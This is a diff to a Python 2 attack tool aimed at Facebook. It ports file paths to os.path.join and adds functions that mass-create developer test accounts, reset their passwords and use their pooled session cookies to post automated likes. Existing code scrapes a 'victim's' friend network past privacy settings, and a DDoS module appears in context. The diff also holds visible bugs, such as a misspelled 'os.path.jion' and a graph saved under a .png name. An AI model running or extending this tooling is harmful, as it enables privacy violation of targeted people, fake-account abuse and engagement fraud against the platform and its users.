@@ -1,3 +1,4 @@
+import sys,os
 from getpass import getpass
 from mainLib import *
 import MyParser 
@@ -15,6 +16,9 @@ import numpy as np
 import community
 from networkx.drawing.nx_agraph import write_dot
 from base64 import b64encode
+import logging
+from mechanize import Request
+
 
 def setGlobalLogginng():
     global globalLogging
@@ -46,8 +50,8 @@ def login(email, password,state):
         print str(e.reason.args) + ' on login module'
         return -1
     except:
-        logs('Can\'t Access the login.php form')
-        print '\rCan\'t Access the login.php form\r'
+        logs("Can't Access the login.php form")
+        print "\rCan't Access the login.php form\r"
         return -1
         
     # Select the first form
@@ -58,8 +62,8 @@ def login(email, password,state):
         br.form['email'] = email
         br.form['pass'] = password
     except:
-        logs('Something bad happen.. Couldn\'t set email and password')
-        print '\rSomething bad happen.. Couldn\'t set email and password\r'
+        logs("Something bad happen.. Couldn't set email and password")
+        print "\rSomething bad happen.. Couldn't set email and password\r"
         return -1
     
     # Send the form
@@ -251,16 +255,19 @@ def massLogin():
     #Flush
     print '\r                                                        \r',
     
+    loadPersistentCookie()
+    
     for person in people:
         #login
-        rsp = login(str(person[2]),str(person[3]),'test')
+        rsp = login(str(person[0]),str(person[3]),'test')
         #percentage
         i+=1
         percentage = (i * 100.0) / len(people)
         print '\rCompleted [%.2f%%]\r'%percentage,
         if rsp == -1:
             database.removeTestUsers(person[0])
-                    
+    
+    savePersistentCookie()               
             
 def friendshipRequest():
     if (len(cookieArray) == 1):
@@ -324,23 +331,22 @@ def sendRequestToList(victim):
     
     try:
         try:
-            persons = open(root+'\\'+directory+'\\'+victim+'.txt',"rb")
+            persons = open( os.path.join(root,directory,victim+".txt"),"rb" )
         except:
             logs('Friend file not found')
             print 'Friend file not found'
             return
         try:
-            persons_send = open(root+'\\'+directory+'\\'+victim+'_friend_send.txt',"rb")
+            persons_send = open( os.path.join(root,directory,victim+"_friend_send.txt"),"rb")
             while True:
                 linea = persons_send.readline()
                 if not linea:
                     break
                 frieds_send.append(linea.strip("\n\r"))
             persons_send.close()
-            persons_send = open(root+'\\'+directory+'\\'+victim+'_friend_send.txt',"ab")
+            persons_send = open(os.path.join(root,directory,victim+"_friend_send.txt"),"ab")
         except:
-            persons_send = open(root+'\\'+directory+'\\'+victim+'_friend_send.txt',"wb")
-            
+            persons_send = open(os.path.join(root,directory,victim+"_friend_send.txt"),"wb")
         while True:
             linea = persons.readline()
             if not linea:
@@ -461,19 +467,22 @@ def savePersistentCookie():
     
 def loadPersistentCookie():
     global cookieArray
-    f = open("cookiesObject","r")
-    cookieArray = pickle.load(f)
-    i = 0
-    ''' Se limpian las cookies que no sirven - se filtra el id para cambiar su estado a logged = 0 '''
-    for cookie in cookieArray:
-        cj._cookies = cookie
-        for element in cj:
-            if (element.name == 'checkpoint'):
-                strip = str(element.value).strip("%7B%22u%22%3A")
-                removeId = strip.split("%2C%22t%22%3A")[0]
-                database.setLoggedOut(removeId)
-                del cookieArray[i]
-        i+=1
+    try:
+        f = open("cookiesObject","r")
+        cookieArray = pickle.load(f)
+        i = 0
+        ''' Se limpian las cookies que no sirven - se filtra el id para cambiar su estado a logged = 0 '''
+        for cookie in cookieArray:
+            cj._cookies = cookie
+            for element in cj:
+                if (element.name == 'checkpoint'):
+                    strip = str(element.value).strip("%7B%22u%22%3A")
+                    removeId = strip.split("%2C%22t%22%3A")[0]
+                    database.setLoggedOut(removeId)
+                    del cookieArray[i]
+            i+=1
+    except:
+        return
             
 def deleteAccounts():
     people = database.getUsers()
@@ -1154,10 +1163,10 @@ def linkFriends(victim):
     root = 'dumps'
     directory = victim
     delay = 1
-    linkedFile = open(root+'\\'+directory+'\\'+victim+'friend_links.html',"wb")
+    linkedFile = open( os.path.join(root,directory,victim+"friend_links.html"),"wb")
     
     try:
-        persons = open(root+'\\'+directory+'\\'+victim+'.txt',"rb")
+        persons = open( os.path.join(root,directory,victim+".txt") ,"rb")
     except:
         print '\r                                                        \r',
         print '\r %s.txt not exists, error on linkFriends module \r' %victim,
@@ -1228,14 +1237,14 @@ def getName(userId):
 def mkdir(directory,root):
     import os
     
-    if os.path.exists(root+'\\'+directory):
+    if os.path.exists(os.path.join(root,directory)):
         return 
     else:
-        os.makedirs(root+'\\'+directory)
+        os.makedirs(os.path.join(root,directory))
          
 
 def saveObjects(victim,matrix,ref):
-    path = 'dumps\\'+victim+'\\objects\\'+victim
+    path = os.path.join("dumps",victim,"objects",victim)
     f = open(path,"wb")
     pickle.dump(matrix,f)
     g = open(path+'.ref',"wb")
@@ -1245,7 +1254,7 @@ def saveObjects(victim,matrix,ref):
     
 def loadObjects(victim):
     try:
-        path = 'dumps\\'+victim+'\\objects\\'+victim
+        path = os.path.join("dumps",victim,"objects",victim)
         f = open(path,"rb")
         A = pickle.load(f)
         g = open( path +'.ref',"rb")
@@ -1258,7 +1267,7 @@ def loadObjects(victim):
 
 def reAnalyzeGraph(victim):
     try:
-        f = open('dumps\\'+victim+'\\objects\\'+victim+'-community',"rb")
+        f = open( os.path.join("dumps",victim,"objects",victim+"-community" ) ,"rb")
         labelGraph = pickle.load(f)
         f.close()
     except:
@@ -1283,9 +1292,9 @@ def reAnalyzeGraph(victim):
             
                 
             nx.draw_spring(egonet,node_color = np.linspace(0,1,len(egonet.nodes())),edge_color = '#000000' ,with_labels=True)
-            plt.savefig(root+"\\"+directory+"\\"+victim+"Community"+str(i)+".pdf")
-            plt.savefig(root+"\\"+directory+"\\"+victim+"Community"+str(i)+".png")
-            write_dot(egonet,root+"\\"+directory+"\\"+victim+"Community"+str(i)+".dot")			
+            plt.savefig( os.path.join(root,directory,victim+"Community"+str(i)+".pdf") )
+            plt.savefig( os.path.join(root,directory,victim+"Community"+str(i)+".png") )
+            write_dot(egonet, os.path.join(root,directory,victim+"Community"+str(i)+".dot") )		
             plt.show()
            
             
@@ -1333,8 +1342,7 @@ def analyzeGraph(victim):
             print '\rIterating on %d of %d - [%.2f%%] completed\r' %(i ,len(idkeys.keys()), percentage), 
             i+=1
         
-        reference = open(root+"\\"+directory+"\\"+victim+"references.txt","wb")
-            
+        reference = open( os.path.join(root,directory,victim+"references.txt") ,"wb")    
         for users in nodekeys.keys():
             line = str(nodekeys[users])+' : '+str(users) 
             reference.write(line + '\n')
@@ -1375,13 +1383,13 @@ def analyzeGraph(victim):
             labelGraph.add_edge(nodekeys[int(labelE[0])],nodekeys[int(labelE[1])])
         
         nx.draw_spring(labelGraph,node_color = np.linspace(0,1,len(labelGraph.nodes())),edge_color = np.linspace(0,1,len(labelGraph.edges())) ,with_labels=True)
-        plt.savefig(root+'\\'+directory+'\\'+victim+"labelGraph_color.pdf")
-        plt.savefig(root+'\\'+directory+'\\'+victim+"labelGraph_color.png")
-        write_dot(labelGraph,root+'\\'+directory+'\\'+victim+"labelGraph_color.dot")    
+        plt.savefig( os.path.join(root,directory,victim+"labelGraph_color.pdf") )
+        plt.savefig( os.path.join(root,directory,victim+"labelGraph_color.png") )
+        write_dot(labelGraph, os.path.join(root,directory,victim+"labelGraph_color.dot") )    
         plt.show()
         
         #Saving the object for future analysis
-        f = open('dumps\\'+victim+'\\objects\\'+victim+'-community',"wb")
+        f = open( os.path.join("dumps",victim,"objects",victim+"-community") ,"wb")
         pickle.dump(labelGraph,f)
         f.close()
         
@@ -1408,9 +1416,9 @@ def analyzeGraph(victim):
             
                 
             nx.draw_spring(egonet,node_color = np.linspace(0,1,len(egonet.nodes())),edge_color = '#000000' ,with_labels=True)
-            plt.savefig(root+"\\"+directory+"\\"+victim+"Community"+str(i)+".pdf")
-            plt.savefig(root+"\\"+directory+"\\"+victim+"Community"+str(i)+".png")
-            write_dot(egonet,root+"\\"+directory+"\\"+victim+"Community"+str(i)+".dot")				
+            plt.savefig( os.path.join(root,directory,victim+"Community"+str(i)+".pdf") )
+            plt.savefig( os.path.join(root,directory,victim+"Community"+str(i)+".png") )
+            write_dot(egonet, os.path.join(root,directory,victim+"Community"+str(i)+".dot") )   			
             plt.show()
            
             
@@ -1449,7 +1457,7 @@ def bypassFriendshipPrivacyPlot(victim, transitive):
     visited = []  
     try:
         #If the file already exists 
-        friendshipFile = open(root+'\\'+directory+'\\'+victim+'.txt',"rb")
+        friendshipFile = open( os.path.join(root,directory,victim+".txt") ,"rb")
         #Reads every line of the file
         while True:
             linea = friendshipFile.readline()
@@ -1468,7 +1476,7 @@ def bypassFriendshipPrivacyPlot(victim, transitive):
     
     except:
         #If the file does not exists, creates the file
-        friendshipFile = open(root+'\\'+directory+'\\'+victim+'.txt',"wb")
+        friendshipFile = open( os.path.join(root,directory,victim+".txt") ,"wb")
         friendshipFile.close()
      
     
@@ -1556,10 +1564,9 @@ def bypassFriendshipPrivacyPlot(victim, transitive):
             
     #Check if the file exists, if true append, else create and writes
     try:
-        friendshipFile = open(root+'\\'+directory+'\\'+victim+'.txt',"ab")
+        friendshipFile = open( os.path.join(root,directory,victim+".txt") ,"ab")
     except:
-        friendshipFile = open(root+'\\'+directory+'\\'+victim+'.txt',"wb")
-        
+        friendshipFile = open( os.path.join(root,directory,victim+".txt") ,"wb")
     #Stores every userID for further analyzis
     for friends in friendships:
         if coleccion.has_key(friends) == False:
@@ -1575,15 +1582,14 @@ def bypassFriendshipPrivacyPlot(victim, transitive):
     
     friendshipFile.close()
     
-    mkdir('objects',root+'\\'+directory)
-    
+    mkdir('objects', os.path.join(root,directory))
     A = nx.adj_matrix(myGraph)
     saveObjects(victim, A, coleccion)
     
     nx.draw_spring(myGraph,node_color = np.linspace(0,1,len(myGraph.nodes())),edge_color = np.linspace(0,1,len(myGraph.edges())) ,with_labels=True)
-    plt.savefig(root+'\\'+directory+'\\'+victim+"graph_color.pdf")
-    plt.savefig(root+'\\'+directory+'\\'+victim+"graph_color.png")
-    write_dot(myGraph,root+'\\'+directory+'\\'+victim+"graph_color.dot")	
+    plt.savefig( os.path.join(root,directory,victim+"graph_color.pdf") )
+    plt.savefig( os.path.join(root,directory,victim+"graph_color.png") )
+    write_dot(myGraph,os.path.join(root,directory,victim+"graph_color.dot"))  
     plt.show()
 
    
@@ -1597,7 +1603,7 @@ def bypassFriendshipPrivacy(victim, transitive):
     visited = []  
     try:
         #If the file already exists 
-        friendshipFile = open('dumps\\'+victim+'.txt',"rb")
+        friendshipFile = open( os.path.join("dumps",victim+".txt") ,"rb")
         #Reads every line of the file
         while True:
             linea = friendshipFile.readline()
@@ -1610,7 +1616,7 @@ def bypassFriendshipPrivacy(victim, transitive):
     
     except:
         #If the file does not exists, creates the file
-        friendshipFile = open('dumps\\'+victim+'.txt',"wb")
+        friendshipFile = open( os.path.join("dumps",victim+".txt") ,"wb")
         friendshipFile.close()
      
     
@@ -1665,10 +1671,10 @@ def bypassFriendshipPrivacy(victim, transitive):
             
     #Check if the file exists, if true append, else create and writes
     try:
-        friendshipFile = open('dumps\\'+victim+'.txt',"ab")
+        friendshipFile = open( os.path.join("dumps",victim+".txt") ,"ab")
     except:
-        friendshipFile = open('dumps\\'+victim+'.txt',"wb")
-        
+        friendshipFile = open( os.path.join("dumps",victim+".txt") ,"wb")
+
     #Stores every userID for further analyzis
     for friends in friendships:
         friendshipFile.write(str(friends)+'\n')
@@ -1765,10 +1771,10 @@ def simpleGraph(friends, victim):
     nodeID += 1
     #Check if the file exists, if true append, else create and writes
     try:
-        friendshipFile = open(root+'\\'+directory+'\\'+victim+'.txt',"ab")
+        friendshipFile = open( os.path.join(root,directory,victim+".txt"),"ab")
     except:
-        friendshipFile = open(root+'\\'+directory+'\\'+victim+'.txt',"wb")
-        
+        friendshipFile = open( os.path.join(root,directory,victim+".txt"),"wb")
+
     for friend in friends:
         
         friendshipFile.write(str(friend)+'\n')
@@ -1801,9 +1807,9 @@ def simpleGraph(friends, victim):
     saveObjects(victim, A, coleccion)
     
     nx.draw_spring(myGraph,node_color = np.linspace(0,1,len(myGraph.nodes())),edge_color = np.linspace(0,1,len(myGraph.edges())) ,with_labels=True)
-    plt.savefig(root+'\\'+directory+'\\'+victim+"graph_color.pdf")
-    plt.savefig(root+'\\'+directory+'\\'+victim+"graph_color.png")
-    write_dot(myGraph,root+'\\'+directory+'\\'+victim+"graph_color.dot")    
+    plt.savefig( os.path.join(root,directory,victim+"graph_color.pdf") )
+    plt.savefig( os.path.join(root,directory,victim+"graph_color.png") )
+    write_dot(myGraph,os.path.join(root,directory,victim+"graph_color.png"))  
     plt.show()
     
 def friendshipPlot(text,victim):
@@ -1974,14 +1980,11 @@ def getUserID(user):
             return -1
     
 def logs(messagelog):
-    try:
-        f = open("logs\\error.log","ab")
-    except:
-        f = open("logs\\error.log","wb")
+    
+    logging.basicConfig(filename=os.path.join("logs","error.log"), level=logging.NOTSET, format='')
     cTime = ctime(time())
-    log = str(cTime) + ' : ' + str(messagelog) + '\n'
-    f.write(log)
-    f.close()
+    log = str(cTime) + ' : ' + str(messagelog)
+    logging.debug(log)
     
     
 def dotFile(victim, transitive):
@@ -1991,7 +1994,7 @@ def dotFile(victim, transitive):
     
     mkdir(directory,root)
     
-    myGraph = open(root+'\\'+directory+'\\'+victim+'_dot.dot',"wb")
+    myGraph = open( os.path.join(root,directory,victim+"_dot.dot") ,"wb")
     myGraph.write('Graph {\n')
     
     #Percentage container
@@ -2002,7 +2005,7 @@ def dotFile(victim, transitive):
     visited = []  
     try:
         #If the file already exists 
-        friendshipFile = open(root+'\\'+directory+'\\'+victim+'.txt',"rb")
+        friendshipFile = open( os.path.jion(root,directory,victim+".txt") ,"rb")
         #Reads every line of the file
         while True:
             linea = friendshipFile.readline()
@@ -2014,7 +2017,7 @@ def dotFile(victim, transitive):
 
     except:
         #If the file does not exists, creates the file
-        friendshipFile = open(root+'\\'+directory+'\\'+victim+'.txt',"wb")
+        friendshipFile = open( os.path.join(root,directory,victim+".txt") ,"wb")
         friendshipFile.close()
      
     
@@ -2082,9 +2085,9 @@ def dotFile(victim, transitive):
             
     #Check if the file exists, if true append, else create and writes
     try:
-        friendshipFile = open(root+'\\'+directory+'\\'+victim+'.txt',"ab")
+        friendshipFile = open( os.path.join(root,directory,victim+".txt") ,"ab")
     except:
-        friendshipFile = open(root+'\\'+directory+'\\'+victim+'.txt',"wb")
+        friendshipFile = open( os.path.join(root,directory,victim+".txt") ,"wb")
         
     #Stores every userID for further analysis
     for friends in friendships:
@@ -2102,11 +2105,11 @@ def simpleDotGraph(friends, victim):
     
     mkdir(directory,root)
     
-    myGraph = open(root+'\\'+directory+'\\'+victim+'_dot.dot',"wb")
+    myGraph = open( os.path.join(root,directory,victim+"_dot.dot"),"wb")
     myGraph.write('Graph    {\n')
     
   
-    friendshipFile = open(root+'\\'+directory+'\\'+victim+'.txt',"wb")
+    friendshipFile = open( os.path.join(root,directory,victim+".txt"),"wb")
     for friend in friends:
         friendshipFile.write(str(friend)+'\n')
     friendshipFile.close()
@@ -2170,4 +2173,236 @@ def noteDDoS(imageURL,noteID, privacy):
     except:
         logs('Error in the DDoS module')
         print '\rError in the DDoS module\r'
+        raise
+    
+def devTest(appID):
+    set_dtsg()
+    dtsg = br.form['fb_dtsg']
+    br.open('https://developers.facebook.com/').read()
+    arguments = {   
+        'fb_dtsg' : dtsg,
+        'count' : '4',
+        'app_id' : str(appID),
+        'install_app' : '1',
+        'platform_version' : 'v2.0',
+        'enable_ticker' : '1',
+        'language' : 'en_US',
+        '__user' : getC_user(), 
+        '__a' : '1',
+        '__dyn' : '7w86i1PyUnxqnFwn8',
+        '__req' : '3',
+        'ttstamp' : '2658172110116109767311810511273',
+        '__rev' : '1262242'
+        }
+    
+    datos = urlencode(arguments)
+    try:
+        response = br.open('https://developers.facebook.com/apps/async/test-users/create/',datos)
+    except mechanize.HTTPError as e:
+        logs(e.code)
+        print e.code
+    except mechanize.URLError as e:
+        logs(e.reason.args)
+        print e.reason.args    
+    except:
+        logs('Error in devTest module')
+        print '\rError in devTest module\r'
+        raise
+'''    
+def getTest(appID):
+    try:
+        response = br.open('https://developers.facebook.com/apps/'+appID+'/roles/test-users/')
+        
+        linea = response.read()
+        lines = []
+        
+        match = re.search('test_users'+'(.+)',linea)
+        if match is not None:
+            encontrada =  match.group()
+        
+        start = 0
+        while True:
+            matchstart = re.search('test_user_ids',encontrada[start:])
+            if matchstart is not None:
+                matchend = re.search('\.net',encontrada[start+matchstart.end():])
+                if (matchstart is not None) and (matchend is not None):
+                    final = encontrada[start+matchstart.start() : matchend.end()+start+matchstart.end()]
+                    lines.append(final)
+                    start = start+matchstart.start()+matchend.end()
+            else:
+                break
+        
+        email = []
+        name = []
+        userid = []
+        for linea in lines:
+            matchstart =re.search('value="',linea)
+            matchend = re.search('"',linea[matchstart.end():])
+            userid.append(linea[matchstart.end():matchstart.end()+matchend.start()])
+        for linea in lines:
+            start=0
+            while True:
+                matchstart = re.search("\"_50f4\">",linea[start:])
+                if matchstart is not None:
+                    matchend = re.search('</span>',linea[start+matchstart.end():])
+                    if (matchstart is not None) and (matchend is not None):
+                        final = linea[start+matchstart.end() : matchend.start()+start+matchstart.end()]
+                        name.append(final)
+                        start = start+matchstart.start()+matchend.end()
+                        matchstart = re.search("_5jxf\"><span class=\"_50f4\">",linea[start:])
+                        if matchstart is not None:
+                            email.append(linea[matchstart.end()+start:].replace('&#064;','@'))
+                            break
+                        else:
+                            print 'error'
+                else:
+                    break
+    
+        for elements in email:
+            print elements
+        for elements in name:
+            print elements
+        for elements in userid:
+            print elements
+        
+    except mechanize.HTTPError as e:
+        logs(e.code)
+        print e.code
+    except mechanize.URLError as e:
+        logs(e.reason.args)
+        print e.reason.args    
+    except:
+        logs('Error in getTest module')
+        print '\rError in getTest module\r'
         raise 
+'''
+def getTest(appID):
+    try:
+        start = 0
+        flag = 0
+        while flag != -1:
+            
+            set_dtsg()
+            dtsg = br.form['fb_dtsg']
+            arguments = {   
+                'start' : str(start),
+                '__user' : getC_user(),
+                '__a' : '1',
+                '__dyn' : '7w86i1PyUnxqnFwn8',
+                '__req' : '4',
+                'fb_dtsg' : dtsg,
+                'ttstamp' : '26581707111311350113871144898',
+                '__rev' : '1262242'
+            }
+            datos = urlencode(arguments)
+            try:
+                response = br.open('https://developers.facebook.com/apps/'+appID+'/roles/test-users/paging/',datos)
+                aParsear = response.read().strip("for (;;);")
+                json_dump = json.loads(aParsear)
+                flag = MyParser.parceros(json_dump)
+                start += 20 
+                print ' 20 cuentas creadas'
+            except:
+                break
+    except:
+        print 'general error'
+
+def changePassword(appID):        
+    people = database.getUsers()
+    peopleLogged = database.getUsersNotLogged()
+    for persona in people:
+        if persona in peopleLogged:
+            try:
+                set_dtsg()
+                dtsg = br.form['fb_dtsg']
+                arguments = { 
+                    'fb_dtsg' : dtsg,  
+                    'name' : str(persona[1]),
+                    'password' : '1234567890',
+                    'confirm_password' : '1234567890',
+                    '__user' : getC_user(),
+                    '__a' : '1',
+                    '__dyn' : '7w86i1PyUnxqnFwn8',
+                    '__req' : 'a',
+                    'ttstamp' : '26581698582558910610211811276',
+                    '__rev' : '1262776'
+                }
+                datos = urlencode(arguments)
+                try:
+                    response = br.open('https://developers.facebook.com/apps/async/test-users/edit/?app_id='+appID+'&test_user_id='+str(persona[0]),datos)
+                except:
+                    print 'error'
+            except:
+                print 'Error General'
+        
+        
+        
+def likeDev(postId, quantity,appID):
+        
+    signal.signal(signal.SIGINT, signal_handler)
+    try:
+        #Cookie of the real account
+        masterCookie = cj._cookies
+        times = int(quantity) / 4
+        
+        massLogin()
+        #Percentage container
+        percentage = 0.0
+        j = 0.0
+        total = len(cookieArray) * len(postId)
+        #flush
+        print '\r                                                        \r',
+        
+        for i in range(len(cookieArray)):
+            for post in range(len(postId)):
+                cj._cookies = cookieArray[i]
+                c_user = getC_user()
+                try:
+                    set_dtsg()
+                    
+                    arguments = {
+                        'like_action' : 'true',
+                        'ft_ent_identifier' : str(postId[post]),
+                        'source' : '0',
+                        'client_id' : str(c_user)+'%3A4047576437',
+                        'rootid' : 'u_0_2o',
+                        'giftoccasion' : '',
+                        'ft[tn]' : '%3E%3D',
+                        'ft[type]' : '20',
+                        'nctr[_mod]' : 'pagelet_timeline_recent',
+                        '__user' : c_user,
+                        '__a' : '1',
+                        '__dyn' : '7n8ahyj35ym3KiA',
+                        '__req' : 'c',
+                        'fb_dtsg' : br.form['fb_dtsg'],
+                        'phstamp' : '165816595797611370260',
+                    }
+                    
+                                
+                    datos = urlencode(arguments)
+                    response = br.open('https://www.facebook.com/ajax/ufi/like.php',datos)
+                    
+                    if globalLogging:
+                        logs(response.read())
+                    
+                    percentage = (j * 100.0)/total
+                    print '\r[%.2f%%] of likes completed\r' %(percentage), 
+                    j+=1
+                        
+                except mechanize.HTTPError as e:
+                    print e.code
+                    
+                except mechanize.URLError as e:
+                        print e.reason.args  
+                except Exception as e:
+                    print 'Unknown error: %s' % e.args 
+            
+        cj._cookies = masterCookie           
+        raw_input('Finished like() module, press enter to continue')
+    except signalCaught as e:
+        deleteUser()
+        message = '%s catch from create module' %e.args[0]
+        logs(str(message))
+        print '%s \n' %message
+        raw_input('Press enter to continue')
+        return
